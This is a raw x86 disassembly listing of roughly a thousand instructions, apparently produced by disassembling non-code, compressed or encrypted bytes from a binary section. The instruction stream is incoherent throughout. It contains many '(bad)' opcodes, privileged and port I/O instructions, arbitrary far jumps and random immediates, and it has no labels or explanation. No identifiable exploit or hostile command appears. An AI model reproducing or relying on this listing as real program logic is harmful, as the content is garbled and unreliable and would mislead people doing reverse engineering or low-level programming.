  410a3a:	pop    eax
  410a3b:	iret   
  410a3c:	lea    esp,ds:0xcd6587c8
  410a42:	mov    edx,0x889e03a0
  410a47:	sbb    eax,0x47d1e41e
  410a4c:	mov    ecx,DWORD PTR [ecx-0x4f]
  410a4f:	loopne 0x410a7e
  410a51:	xor    cl,BYTE PTR [eax-0x6d]
  410a54:	iret   
  410a55:	or     bl,BYTE PTR [eax-0x4c]
  410a58:	in     eax,dx
  410a59:	in     al,0x1b
  410a5b:	lds    edx,FWORD PTR ds:0xdf2ac5e8
  410a61:	mul    esi
  410a63:	push   es
  410a64:	(bad)  
  410a65:	lahf   
  410a66:	cmp    edx,DWORD PTR [edx]
  410a68:	add    al,0x3b
  410a6a:	lea    esp,[ebp+0x12]
  410a6d:	aas    
  410a6e:	ret    0xd130
  410a71:	fs int3 
  410a73:	stc    
  410a74:	sbb    dl,0x33
  410a77:	mov    bh,bl
  410a79:	imul   esp,DWORD PTR [esp+edx*1-0x46],0xf8519264
  410a81:	dec    ecx
  410a82:	int3   
  410a83:	mov    ds:0xd30db163,al
  410a88:	out    0x41,al
  410a8a:	inc    esi
  410a8b:	popa   
  410a8c:	jmp    0x6d14717a
  410a91:	inc    edx
  410a92:	mov    ebx,0xce6b22c8
  410a97:	and    esi,DWORD PTR [eax]
  410a99:	pop    es
  410a9a:	fmul   DWORD PTR [ebp-0x2f52ce1]
  410aa0:	inc    BYTE PTR [edi-0x5c350407]
  410aa6:	pop    ebp
  410aa7:	mov    ecx,0xebdaea5f
  410aac:	push   cs
  410aad:	jp     0x410a81
  410aaf:	mul    DWORD PTR [ecx-0x6008ddf2]
  410ab5:	dec    edx
  410ab6:	push   ds
  410ab7:	add    al,0x1f
  410ab9:	dec    edx
  410aba:	repz mov bl,0x76
  410abd:	dec    ebx
  410abe:	jnp    0x410a96
  410ac0:	sbb    ah,BYTE PTR [ebp-0x33]
  410ac3:	pop    es
  410ac4:	fs fwait
  410ac6:	ja     0x410a67
  410ac8:	test   al,0x0
  410aca:	fs cmovb ecx,DWORD PTR cs:[ecx-0x65330b43]
  410ad3:	call   0xcf6a1329
  410ad8:	(bad)  
  410ad9:	mov    al,0x6c
  410adb:	pop    ds
  410adc:	mov    bh,BYTE PTR [edx-0x63c4211f]
  410ae2:	mov    al,ds:0xe00ecb85
  410ae7:	enter  0xcd68,0x97
  410aeb:	add    ah,ch
  410aed:	ds das 
  410aef:	add    dh,BYTE PTR [eax-0x6c]
  410af2:	pop    ds
  410af3:	pop    edi
  410af4:	aam    0xc7
  410af6:	jno    0x410af7
  410af8:	mov    ecx,0x1d7439d9
  410afd:	les    esp,FWORD PTR [ebx]
  410aff:	mov    edx,0xc3d039eb
  410b04:	das    
  410b05:	(bad)  
  410b06:	mov    al,ds:0x63d14526
  410b0b:	xchg   esi,eax
  410b0c:	cmp    al,0x1c
  410b0e:	xor    eax,0x68b78fdf
  410b13:	stc    
  410b14:	cmp    al,0xcf
  410b16:	stc    
  410b17:	push   ss
  410b18:	sbb    BYTE PTR [esi+0x2f],0xa0
  410b1c:	and    eax,0xa7711486
  410b21:	push   ds
  410b22:	xor    BYTE PTR [esi+ebx*1],0xe2
  410b26:	mov    esi,0x3fdefef0
  410b2b:	pop    ebx
  410b2c:	fst    QWORD PTR [esi+ecx*1+0x26]
  410b30:	mov    esi,0xe6401094
  410b35:	hlt    
  410b36:	in     al,0x53
  410b38:	sbb    edx,DWORD PTR [edx+0x44f28143]
  410b3e:	repnz mov ds:0xf883e2af,al
  410b44:	(bad)  
  410b45:	ins    DWORD PTR es:[edi],dx
  410b46:	adc    al,0x39
  410b48:	(bad)  
  410b49:	or     DWORD PTR [ebp+0x1a39a459],ebx
  410b4f:	xchg   ebx,eax
  410b50:	adc    dl,BYTE PTR [ecx+0xe]
  410b53:	out    0x75,al
  410b55:	dec    edx
  410b56:	(bad)  
  410b57:	aas    
  410b58:	shr    DWORD PTR [ebp+0x21],cl
  410b5b:	das    
  410b5c:	mov    dh,0xf4
  410b5e:	jg     0x410aee
  410b60:	enter  0xc9b7,0x60
  410b64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b65:	pop    ebx
  410b66:	cmp    BYTE PTR [edx+0x67d708de],0x7d
  410b6d:	repz test DWORD PTR [edx+0x63cff518],0x25094675
  410b78:	or     eax,0x37416157
  410b7d:	jo     0x410b16
  410b7f:	push   ds
  410b80:	push   ebx
  410b81:	mov    al,0xbc
  410b83:	inc    BYTE PTR [eax+0x3]
  410b86:	rcl    BYTE PTR [esi],cl
  410b88:	pop    esp
  410b89:	xor    BYTE PTR [esi+eax*4],ah
  410b8c:	sub    bl,0xa6
  410b8f:	fidiv  WORD PTR [ebx]
  410b91:	cmp    eax,0x58349835
  410b96:	in     eax,dx
  410b97:	ror    DWORD PTR [eax+0x13],0xf6
  410b9b:	cmp    dl,BYTE PTR [ecx+esi*2]
  410b9e:	call   0x7290b08f
  410ba3:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  410ba5:	push   ecx
  410ba6:	and    al,0x21
  410ba8:	or     eax,0xe43cf8bf
  410bad:	(bad)  
  410baf:	out    dx,eax
  410bb0:	(bad)  
  410bb2:	aad    0xad
  410bb4:	push   0x3
  410bb6:	jmp    0x3c99:0x371b5793
  410bbd:	jg     0x410b82
  410bbf:	ret    
  410bc0:	dec    esp
  410bc1:	push   0xffffffb4
  410bc3:	adc    esp,DWORD PTR [ebp+0xc93f8ef]
  410bc9:	fld    QWORD PTR [edi-0x224a39d]
  410bcf:	lds    ecx,FWORD PTR [esi+0xe91baf9]
  410bd5:	push   esi
  410bd6:	pop    esp
  410bd7:	add    BYTE PTR [ebx],0x97
  410bda:	dec    dl
  410bdc:	loop   0x410c42
  410bde:	mov    eax,0xe71e19c1
  410be3:	dec    esp
  410be4:	mov    dl,0x80
  410be6:	lds    ebp,FWORD PTR [ecx+esi*1+0x4d51a3ae]
  410bed:	jge    0x410be6
  410bef:	push   ss
  410bf0:	or     al,0x69
  410bf2:	xchg   esp,eax
  410bf3:	enter  0x4fa1,0x3f
  410bf7:	fld    DWORD PTR [ecx-0x545ae27e]
  410bfd:	mov    esp,0xfeeae088
  410c02:	aas    
  410c03:	data16 add al,0x8d
  410c06:	mov    ch,0x38
  410c08:	inc    ebp
  410c09:	or     ebp,DWORD PTR [edi]
  410c0b:	iret   
  410c0c:	jno    0x410c31
  410c0e:	jns    0x410c5d
  410c10:	add    eax,0xfa8e912c
  410c15:	xor    eax,0x2fd2e955
  410c1a:	popf   
  410c1b:	daa    
  410c1c:	lods   eax,DWORD PTR ds:[esi]
  410c1d:	repnz mov eax,0xd8e6aded
  410c23:	ret    
  410c24:	xchg   DWORD PTR [esi+0x14],esi
  410c27:	inc    ebx
  410c28:	adc    esp,esp
  410c2a:	fsub   QWORD PTR [edi]
  410c2c:	add    ecx,eax
  410c2e:	pusha  
  410c2f:	add    al,0x85
  410c31:	push   ebp
  410c32:	xor    ecx,DWORD PTR [edx]
  410c34:	rol    ebp,0x9f
  410c37:	cli    
  410c38:	ins    DWORD PTR es:[edi],dx
  410c39:	fcom   st(5)
  410c3b:	test   esp,esi
  410c3d:	sbb    ch,BYTE PTR [ebp+0x475160bc]
  410c43:	call   0xd316:0x45d4410e
  410c4a:	and    al,0xe0
  410c4c:	sub    BYTE PTR [ebx-0x4c],cl
  410c4f:	sub    BYTE PTR [ebp-0x4d],0x58
  410c53:	jl     0x410c83
  410c55:	cmp    ebx,0x65797d0a
  410c5b:	std    
  410c5c:	push   0x84304778
  410c61:	into   
  410c62:	outs   dx,BYTE PTR ds:[esi]
  410c63:	lea    ecx,ds:0x13bce1a3
  410c69:	sbb    dh,al
  410c6b:	dec    esp
  410c6c:	int    0x60
  410c6e:	inc    edx
  410c6f:	fldl2t 
  410c71:	(bad)  
  410c72:	xor    eax,0x43f12981
  410c77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c78:	lock sub eax,0x7fc6a4b2
  410c7e:	test   dl,al
  410c80:	or     ecx,DWORD PTR [edx+0x47c1f695]
  410c86:	mov    esp,0xda6c117e
  410c8b:	out    dx,al
  410c8c:	sbb    al,0x58
  410c8e:	xchg   DWORD PTR [ecx],esp
  410c90:	fdiv   st(1),st
  410c92:	out    0x24,al
  410c94:	aam    0xc9
  410c96:	lahf   
  410c97:	ins    BYTE PTR es:[edi],dx
  410c98:	out    0x16,al
  410c9a:	fcomp  QWORD PTR ds:0x8f45cbdc
  410ca0:	xor    DWORD PTR [edi],edi
  410ca2:	retf   0xa5ac
  410ca5:	nop
  410ca6:	fxch   st(5)
  410ca8:	mov    ds:0xfe0e4875,eax
  410cad:	test   BYTE PTR [eax-0x9337cf5],0x35
  410cb4:	es ss pop edx
  410cb7:	lds    edx,FWORD PTR [ebx+0x2014417a]
  410cbd:	test   DWORD PTR [ebx],esi
  410cbf:	mov    ecx,0xd3ebb607
  410cc4:	das    
  410cc5:	cmc    
  410cc6:	loop   0x410cd6
  410cc8:	test   DWORD PTR [esi+0x22ddf6a6],ebp
  410cce:	sbb    esi,DWORD PTR [eiz*1+0x47504d2d]
  410cd5:	rcl    BYTE PTR [ebx],cl
  410cd7:	(bad)  
  410cd8:	icebp  
  410cd9:	jae    0x410c6f
  410cdb:	loope  0x410d48
  410cdd:	adc    al,0x79
  410cdf:	(bad)  
  410ce0:	ds pop es
  410ce2:	rcl    BYTE PTR [edx+eiz*2-0x2],0xe
  410ce7:	shl    BYTE PTR [ebx],1
  410ce9:	jge    0x410d38
  410ceb:	daa    
  410cec:	jmp    0x3e97:0x7c45284
  410cf3:	cwde   
  410cf4:	push   esi
  410cf5:	ins    BYTE PTR es:[edi],dx
  410cf6:	sub    eax,0x485efcd0
  410cfb:	xchg   esi,eax
  410cfc:	out    0xf2,eax
  410cfe:	dec    esp
  410cff:	inc    esp
  410d00:	adc    ebp,esp
  410d02:	es push edi
  410d04:	sub    edx,DWORD PTR [ebx-0x6d3db1cc]
  410d0a:	into   
  410d0b:	add    al,0x2f
  410d0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d0e:	push   edx
  410d0f:	ret    
  410d10:	jp     0x410ca2
  410d12:	push   ecx
  410d13:	stc    
  410d14:	call   0xc105449
  410d19:	mov    ds:0x17d47c20,al
  410d1e:	repnz int3 
  410d20:	out    0xf8,eax
  410d22:	fist   DWORD PTR [ebx-0x29e83f9]
  410d28:	xor    eax,0x5a990d58
  410d2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d2e:	mov    ebp,0x59d6cab8
  410d33:	fs mov ecx,0xe803e6f3
  410d39:	push   es
  410d3a:	je     0x410d08
  410d3c:	imul   ebp,DWORD PTR [ebx+0x7c75125],0xffffffe9
  410d43:	(bad)  
  410d44:	and    eax,0x414cc302
  410d49:	and    eax,0xc9ac2efe
  410d4e:	stos   DWORD PTR es:[edi],eax
  410d4f:	jge    0x410cf8
  410d51:	dec    edx
  410d52:	lods   eax,DWORD PTR ds:[esi]
  410d53:	inc    ebx
  410d54:	xchg   edx,eax
  410d55:	mov    eax,ds:0x7a234e17
  410d5a:	inc    edi
  410d5b:	fiadd  DWORD PTR [ecx+0x5477471d]
  410d61:	into   
  410d62:	pop    edx
  410d63:	jp     0x410d4d
  410d65:	sub    ebp,ecx
  410d67:	xchg   ecx,eax
  410d68:	add    cl,cl
  410d6a:	in     eax,0xcf
  410d6c:	aad    0xd3
  410d6e:	cs xchg ebx,eax
  410d70:	adc    eax,ebp
  410d72:	das    
  410d73:	daa    
  410d74:	xor    eax,0xf4b0686
  410d79:	loope  0x410dac
  410d7b:	jmp    0xd6274a3d
  410d80:	fs pop ss
  410d82:	push   cs
  410d83:	push   cs
  410d84:	pushf  
  410d85:	fldenv [edi]
  410d87:	lods   al,BYTE PTR ds:[esi]
  410d88:	outs   dx,DWORD PTR ds:[esi]
  410d89:	pop    ds
  410d8a:	sub    ebx,ebp
  410d8c:	add    ah,ch
  410d8e:	or     eax,0x364d7a
  410d93:	adc    eax,0x74636266
  410d98:	add    DWORD PTR [eax-0x32],edi
  410d9b:	clc    
  410d9c:	mov    cl,0x6
  410d9e:	fmulp  st(6),st
  410da0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410da1:	test   DWORD PTR cs:[edx],edi
  410da4:	push   eax
  410da5:	inc    ebx
  410da6:	scas   eax,DWORD PTR es:[edi]
  410da7:	cdq    
  410da8:	xchg   edi,eax
  410da9:	add    BYTE PTR [edi-0x239a0abb],dl
  410daf:	sar    BYTE PTR [ecx+0x1f],1
  410db2:	cmp    eax,0x4e9aa6a4
  410db7:	icebp  
  410db8:	les    ebx,FWORD PTR [edx]
  410dba:	mov    si,0xed28
  410dbe:	pop    esp
  410dbf:	ss scas eax,DWORD PTR es:[edi]
  410dc1:	sub    BYTE PTR [ebx+0x74],al
  410dc4:	mov    ebx,0x437b0419
  410dc9:	sahf   
  410dca:	inc    esp
  410dcb:	imul   ebp,DWORD PTR [ecx+eiz*2],0xffffffab
  410dcf:	in     eax,0x84
  410dd1:	fld    st(1)
  410dd3:	pop    ss
  410dd4:	lock cld 
  410dd6:	cmp    edi,DWORD PTR [ecx]
  410dd8:	sbb    BYTE PTR [eax-0x80],0x8e
  410ddc:	sub    DWORD PTR [edi+0x31dc38f],0xffffffe0
  410de3:	stos   DWORD PTR es:[edi],eax
  410de4:	inc    ebx
  410de5:	add    esi,DWORD PTR [edx-0x75]
  410de8:	push   ebp
  410de9:	or     cl,ch
  410deb:	out    dx,eax
  410dec:	add    eax,DWORD PTR [eax]
  410dee:	add    BYTE PTR [edi-0x6],al
  410df1:	fisttp DWORD PTR [edx+0x517569e1]
  410df7:	jp     0x410dcf
  410df9:	xchg   ecx,eax
  410dfa:	mov    edx,0x67bd66a3
  410dff:	mov    esp,0x497070b8
  410e04:	jge    0x410e76
  410e06:	jo     0x410df5
  410e08:	mov    esp,DWORD PTR [esi+ebp*2+0xc]
  410e0c:	xlat   BYTE PTR ds:[ebx]
  410e0d:	jne    0x410df7
  410e0f:	xchg   DWORD PTR [ebp-0x65d6c7a2],ebx
  410e15:	sbb    bl,ah
  410e17:	pop    eax
  410e18:	and    BYTE PTR [ecx+0x783fc4ca],cl
  410e1e:	mov    ebx,0x33f78239
  410e23:	gs cmp eax,0x6f8385e3
  410e29:	cld    
  410e2a:	rcr    DWORD PTR [edi],0xbf
  410e2d:	push   0x4f
  410e2f:	outs   dx,DWORD PTR ds:[esi]
  410e30:	pop    edx
  410e31:	fwait
  410e32:	add    ch,BYTE PTR [ebx+0x42790e84]
  410e38:	icebp  
  410e39:	push   edx
  410e3a:	call   0xf95287d8
  410e3f:	rcr    BYTE PTR [edx+ecx*8-0x1b],cl
  410e43:	inc    edi
  410e44:	or     bl,BYTE PTR [ecx+0x574eb41a]
  410e4a:	jp     0x410dec
  410e4c:	stos   DWORD PTR es:[edi],eax
  410e4d:	fstp   DWORD PTR [edx]
  410e4f:	call   0xe3fc:0x28331654
  410e56:	aad    0x11
  410e58:	mov    esi,0x84bc3019
  410e5d:	shl    DWORD PTR [ecx],cl
  410e5f:	neg    BYTE PTR [edx+0x21]
  410e62:	addr16 popa 
  410e64:	mov    al,ds:0xe63a8d2b
  410e69:	jnp    0x410e91
  410e6b:	ins    DWORD PTR es:[edi],dx
  410e6c:	rcl    BYTE PTR [esp+esi*4-0x371a11c3],0xda
  410e74:	sub    cl,ah
  410e76:	inc    esi
  410e77:	xor    DWORD PTR [ecx-0x46b7e6bc],edi
  410e7d:	jg     0x410e4a
  410e7f:	not    BYTE PTR [esi+0x4389f0fd]
  410e85:	xor    eax,0xcadc73f7
  410e8a:	add    BYTE PTR [ebx+0x3e],ah
  410e8d:	dec    ecx
  410e8e:	loopne 0x410e1e
  410e90:	xchg   DWORD PTR es:[ebx+esi*1],eax
  410e94:	push   edi
  410e95:	movzx  ebp,BYTE PTR [edx-0x60]
  410e99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e9a:	or     dl,dl
  410e9c:	push   es
  410e9d:	sub    eax,0x2171b302
  410ea2:	mov    ds:0x2bf9766e,eax
  410ea7:	xor    DWORD PTR [ebx-0x6a9ca27a],ebp
  410ead:	ficom  WORD PTR [ebx-0x1f6ef851]
  410eb3:	in     eax,dx
  410eb4:	and    eax,0x31fc094e
  410eb9:	mov    bh,0xdd
  410ebb:	fbld   TBYTE PTR [eax]
  410ebd:	stos   BYTE PTR es:[edi],al
  410ebe:	lds    ebp,FWORD PTR [edx]
  410ec0:	lods   eax,DWORD PTR ds:[esi]
  410ec1:	cwde   
  410ec2:	stos   DWORD PTR es:[edi],eax
  410ec3:	inc    ebp
  410ec4:	outs   dx,BYTE PTR ds:[esi]
  410ec5:	inc    DWORD PTR [esi-0x18]
  410ec8:	mov    ch,0xdf
  410eca:	or     cl,BYTE PTR gs:[esi+eiz*1]
  410ece:	push   cs
  410ecf:	(bad)  
  410ed1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ed2:	dec    ebx
  410ed3:	inc    edi
  410ed4:	int    0x9e
  410ed6:	dec    esp
  410ed7:	push   ebx
  410ed8:	inc    ebp
  410ed9:	dec    ebp
  410eda:	add    bl,BYTE PTR [ebp-0x31408066]
  410ee0:	ret    
  410ee1:	loop   0x410e86
  410ee3:	mov    esp,0x9459a69a
  410ee8:	aas    
  410ee9:	imul   ebp,edi,0x3c
  410eec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410eed:	ds cdq 
  410eef:	call   DWORD PTR [ecx+0x45]
  410ef2:	sbb    esi,DWORD PTR [edi]
  410ef4:	shr    DWORD PTR [edi],1
  410ef6:	add    ecx,esp
  410ef8:	(bad)  
  410ef9:	retf   0xdb85
  410efc:	add    eax,0x34f78c00
  410f01:	mov    ebp,esp
  410f03:	xchg   edi,eax
  410f04:	fldenv [edi+0x5fc5969b]
  410f0a:	popf   
  410f0b:	outs   dx,DWORD PTR es:[esi]
  410f0d:	fsub   QWORD PTR [eax+0x24]
  410f10:	test   bh,ch
  410f12:	out    0x57,eax
  410f14:	mov    edx,edx
  410f16:	loopne 0x410f53
  410f18:	jp     0x410f18
  410f1a:	sbb    eax,0xf44d778c
  410f1f:	fbstp  TBYTE PTR [esi+ebp*1]
  410f22:	lock mov dl,BYTE PTR [edi-0x240f2118]
  410f29:	test   eax,0xcc39331c
  410f2e:	inc    ecx
  410f2f:	stos   DWORD PTR es:[edi],eax
  410f30:	push   edx
  410f31:	pop    edx
  410f32:	mov    ah,0xb2
  410f34:	xchg   ch,bh
  410f36:	push   ebx
  410f37:	(bad)
  410f3b:	pop    ebp
  410f3c:	ja     0x410f02
  410f3e:	adc    BYTE PTR [edx+0x5f],al
  410f41:	xchg   DWORD PTR ds:0xd0c26ded,esp
  410f47:	aam    0x9
  410f49:	inc    ecx
  410f4a:	add    DWORD PTR [edx+0x3b],edx
  410f4d:	xor    dh,BYTE PTR [ebp+eax*1+0x225ce4df]
  410f54:	repz jp 0x410f60
  410f57:	retf   
  410f58:	int    0x8c
  410f5a:	sbb    eax,0x4d412376
  410f5f:	pop    ecx
  410f60:	pusha  
  410f61:	mov    cs:0xa3d8af8f,al
  410f67:	xlat   BYTE PTR ds:[ebx]
  410f68:	stos   DWORD PTR es:[edi],eax
  410f69:	sti    
  410f6a:	enter  0xa10c,0xf2
  410f6e:	or     ecx,DWORD PTR [ecx+0x1f]
  410f71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f72:	dec    eax
  410f73:	adc    ah,dh
  410f75:	xchg   edx,eax
  410f76:	rcr    esi,cl
  410f78:	push   ecx
  410f79:	add    DWORD PTR [ebp+0x77bfb9c4],edi
  410f7f:	push   edx
  410f80:	jge    0x410f51
  410f82:	fwait
  410f83:	mov    cl,0x58
  410f85:	push   ecx
  410f86:	mov    esi,0x5e67aaf0
  410f8b:	xchg   ebx,eax
  410f8c:	loopne 0x410f36
  410f8e:	xchg   ebx,eax
  410f8f:	and    ecx,DWORD PTR [eax-0x3d]
  410f92:	lds    ebx,FWORD PTR [esi+eiz*2-0xa]
  410f96:	pop    ecx
  410f97:	stos   DWORD PTR es:[edi],eax
  410f98:	jmp    0x15f1:0x12fb963
  410f9f:	mov    ch,0x4f
  410fa1:	adc    cl,BYTE PTR [bp+si-0x28b4]
  410fa6:	jae    0x410f2c
  410fa8:	mov    cl,0x2d
  410faa:	sbb    DWORD PTR [eax+0x1c],esi
  410fad:	dec    ecx
  410fae:	jmp    0x2946ec3e
  410fb3:	stc    
  410fb4:	leave  
  410fb5:	mov    ds:0x911361cf,eax
  410fba:	rcl    BYTE PTR [ecx+0x39],1
  410fbd:	push   0xb
  410fbf:	or     DWORD PTR [edx-0x7d],0x23
  410fc3:	mov    eax,0xb9cc68a1
  410fc8:	mov    cl,0x2c
  410fca:	cmp    BYTE PTR gs:[ebx],cl
  410fcd:	pop    edx
  410fce:	ja     0x410f59
  410fd0:	bound  edx,QWORD PTR [ebx+0x65fc242f]
  410fd6:	and    eax,0xd1259144
  410fdb:	mov    edx,DWORD PTR [ebx]
  410fdd:	and    ebp,DWORD PTR [ecx+0x58962c47]
  410fe3:	xor    eax,0xd092aacc
  410fe8:	mov    eax,0x37d77b94
  410fed:	mov    edi,eax
  410fef:	and    eax,0x36f9d450
  410ff4:	inc    esi
  410ff5:	popf   
  410ff6:	ja     0x41104c
  410ff8:	jno    0x410f8e
  410ffa:	sbb    dl,BYTE PTR [eax]
  410ffc:	inc    esp
  410ffd:	stos   DWORD PTR es:[edi],eax
  410ffe:	lods   eax,DWORD PTR ds:[esi]
  410fff:	mov    ebx,edx
  411001:	psubsb mm7,mm1
  411004:	and    bh,BYTE PTR [eax-0x4401938c]
  41100a:	scas   eax,DWORD PTR es:[edi]
  41100b:	sbb    ch,cl
  41100d:	test   DWORD PTR [edx],0x910928d0
  411013:	es mov bh,0x3a
  411016:	pop    edi
  411017:	out    0x34,eax
  411019:	mov    ebp,0xc0d024c6
  41101e:	cld    
  41101f:	jecxz  0x411059
  411021:	or     DWORD PTR [eax],ebx
  411023:	ror    DWORD PTR [ebx],0xe3
  411026:	adc    al,0x29
  411028:	add    DWORD PTR [esp+eiz*8],esi
  41102b:	(bad)  [edi-0x24]
  41102e:	pop    ss
  41102f:	sub    eax,esi
  411031:	inc    eax
  411032:	add    al,0x11
  411034:	arpl   WORD PTR [ebx],cx
  411036:	loop   0x41109e
  411038:	jp     0x410fc0
  41103a:	(bad)  
  41103b:	lods   al,BYTE PTR ds:[esi]
  41103c:	shl    BYTE PTR [edi],1
  41103e:	scas   al,BYTE PTR es:[edi]
  41103f:	out    0x6f,eax
  411041:	jae    0x411059
  411043:	call   0x872:0x736ab825
  41104a:	(bad)
  41104d:	not    DWORD PTR [edx]
  41104f:	xor    bl,BYTE PTR [edi+0xc]
  411052:	xchg   ecx,esi
  411054:	fistp  WORD PTR [ecx+0x2e]
  411057:	(bad)  
  411058:	adc    eax,0xd59e5873
  41105d:	test   DWORD PTR [esi+0x46],ebx
  411060:	aaa    
  411061:	pop    edx
  411062:	sub    ch,BYTE PTR [eax]
  411064:	push   esi
  411065:	aas    
  411066:	sub    BYTE PTR [eax],al
  411068:	cmp    cl,BYTE PTR [esp+edx*8+0x2d]
  41106c:	adc    BYTE PTR [ebx+eiz*4],bl
  41106f:	mov    edx,0xf98fe75
  411074:	imul   ecx,edi,0xffffffef
  411077:	cmc    
  411078:	mov    ss,WORD PTR [edi-0x5bf83e4b]
  41107e:	cmp    eax,0xde42c5b3
  411083:	mov    bh,0x43
  411085:	pop    esp
  411086:	cwde   
  411087:	rcl    BYTE PTR [ecx+0x2b],cl
  41108a:	rol    edx,cl
  41108c:	add    al,0x2f
  41108e:	jno    0x41110b
  411090:	or     BYTE PTR [eax+0x66],bl
  411093:	and    ah,BYTE PTR [edi-0x3faa74e]
  411099:	push   ebx
  41109a:	sub    al,0x5
  41109c:	test   al,0x1e
  41109e:	and    DWORD PTR [ebx],ecx
  4110a0:	or     bh,BYTE PTR [eax-0x709c1288]
  4110a6:	pop    esp
  4110a7:	add    dl,BYTE PTR [ecx-0x4c]
  4110aa:	es es sub eax,0xd287f2ad
  4110b1:	repnz frstor [edi-0x7c96e88a]
  4110b8:	stos   DWORD PTR es:[edi],eax
  4110b9:	fisttp QWORD PTR [ebx]
  4110bb:	aaa    
  4110bc:	add    BYTE PTR ds:[eax-0x59e1fe4a],bl
  4110c3:	push   ebp
  4110c4:	sti    
  4110c5:	shl    edi,1
  4110c7:	mov    eax,ds:0x3ee61e32
  4110cc:	dec    esp
  4110cd:	sub    DWORD PTR [ebp-0xed8f3a0],ecx
  4110d3:	cmp    esi,DWORD PTR [esi+edx*1-0x38]
  4110d7:	cmp    BYTE PTR [ecx],ah
  4110d9:	and    edi,DWORD PTR [esi-0x3f]
  4110dc:	inc    ebp
  4110dd:	pop    ebx
  4110de:	jge    0x4110ae
  4110e0:	xor    ebx,DWORD PTR [edi]
  4110e2:	or     al,0x47
  4110e4:	add    BYTE PTR [ecx+0x46],al
  4110e7:	ja     0x411108
  4110e9:	add    al,0x1a
  4110eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110ec:	jmp    0x650df3fb
  4110f1:	xlat   BYTE PTR ds:[ebx]
  4110f2:	xchg   edx,eax
  4110f3:	inc    esp
  4110f4:	sbb    eax,0x745a3a57
  4110f9:	mov    bh,0xd0
  4110fb:	pop    es
  4110fc:	sub    DWORD PTR [ebp+0x2592336f],ecx
  411102:	mov    cl,0x2
  411104:	loope  0x411104
  411106:	push   ebx
  411107:	fcmovnb st,st(6)
  411109:	or     DWORD PTR [ebx-0x4da2f336],ebp
  41110f:	imul   edi,DWORD PTR [ebx],0x2cf8bff
  411115:	jbe    0x411151
  411117:	jecxz  0x411130
  411119:	gs pop esi
  41111b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41111c:	cmp    al,0x6e
  41111e:	pop    ebx
  41111f:	sub    ecx,edi
  411121:	outs   dx,DWORD PTR ds:[esi]
  411122:	rol    BYTE PTR [ecx+esi*8-0x504d7b1c],cl
  411129:	push   ebp
  41112a:	jle    0x411172
  41112c:	xchg   ecx,eax
  41112d:	div    DWORD PTR [ecx+0x56b77c29]
  411133:	inc    edi
  411134:	pop    ebp
  411135:	outs   dx,BYTE PTR ds:[esi]
  411136:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411137:	leave  
  411138:	jp     0x411187
  41113a:	jmp    0x4111af
  41113c:	mov    cl,0x2d
  41113e:	arpl   WORD PTR [ebp+0x6e],dx
  411141:	aad    0x4a
  411143:	jb     0x411104
  411145:	into   
  411146:	xor    bl,dl
  411148:	jno    0x411147
  41114a:	adc    al,0xca
  41114c:	dec    edi
  41114d:	or     esp,DWORD PTR [ebx+0x85c7247]
  411153:	repz pop esp
  411155:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411157:	or     DWORD PTR [esi],0xc56559a1
  41115d:	ins    DWORD PTR es:[edi],dx
  41115e:	cli    
  41115f:	xchg   ebx,eax
  411160:	xchg   ecx,eax
  411161:	call   0x1fc6:0xa666166c
  411168:	lahf   
  411169:	sahf   
  41116a:	call   DWORD PTR ds:0xae1ffc52
  411170:	call   edi
  411172:	fwait
  411173:	push   ds
  411174:	mov    edi,0xb7d3b045
  411179:	mov    edx,0x9709ea7d
  41117e:	sbb    al,0xa8
  411180:	jmp    DWORD PTR [ebp-0x49fde628]
  411186:	push   esi
  411187:	adc    bh,BYTE PTR [eax+ebx*1+0x62]
  41118b:	xchg   esp,eax
  41118c:	bound  esp,QWORD PTR [esi+0x3a]
  41118f:	adc    DWORD PTR [edi-0x5bff720c],0xfffffffd
  411196:	mov    bl,BYTE PTR [edx-0x50]
  411199:	adc    al,0x9b
  41119b:	gs cs and al,0xe6
  41119f:	or     al,0xbc
  4111a1:	gs scas eax,DWORD PTR es:[edi]
  4111a3:	dec    esi
  4111a4:	pushf  
  4111a5:	xor    DWORD PTR [ebx-0x15],eax
  4111a8:	and    DWORD PTR [edx-0x5f],ebx
  4111ab:	outs   dx,DWORD PTR ds:[esi]
  4111ac:	repnz ror BYTE PTR [ecx+0x24e30d31],1
  4111b3:	xor    ch,BYTE PTR [esi+0x68]
  4111b6:	fs ret 0x4f7
  4111ba:	mov    ds:0x3aae742d,eax
  4111bf:	jmp    0x411234
  4111c1:	imul   eax,DWORD PTR [ebx],0xfffffffc
  4111c4:	jle    0x4111c5
  4111c6:	cmp    al,0x94
  4111c8:	push   ds
  4111c9:	jmp    0xc6d8f4a0
  4111ce:	sbb    eax,0xb50dd466
  4111d3:	mov    ds:0x37e2dbac,eax
  4111d8:	popf   
  4111d9:	jne    0x4111ca
  4111db:	outs   dx,BYTE PTR ds:[esi]
  4111dc:	xchg   esi,eax
  4111dd:	xchg   DWORD PTR [ebx],esi
  4111df:	ror    DWORD PTR [ebp+0x729c1084],0x32
  4111e6:	add    BYTE PTR [ecx+0x458b0845],cl
  4111ec:	call   0x4501da
  4111f1:	add    BYTE PTR [eax-0x646c64c4],dh
  4111f7:	jae    0x411261
  4111f9:	rol    DWORD PTR [ebp+0x7d435cff],cl
  4111ff:	jno    0x411198
  411201:	xlat   BYTE PTR ds:[ebx]
  411202:	xchg   ebp,eax
  411203:	inc    esp
  411204:	jo     0x411276
  411206:	dec    ecx
  411207:	jge    0x411279
  411209:	jo     0x4111e3
  41120b:	mov    dh,0xc3
  41120d:	mov    edi,0x1a17c338
  411212:	div    BYTE PTR [eax-0x29]
  411215:	out    0x2f,eax
  411217:	call   0xf3d5:0x667e0fce
  41121e:	fcmovb st,st(4)
  411220:	arpl   bp,bp
  411222:	sbb    esi,0xffffff9f
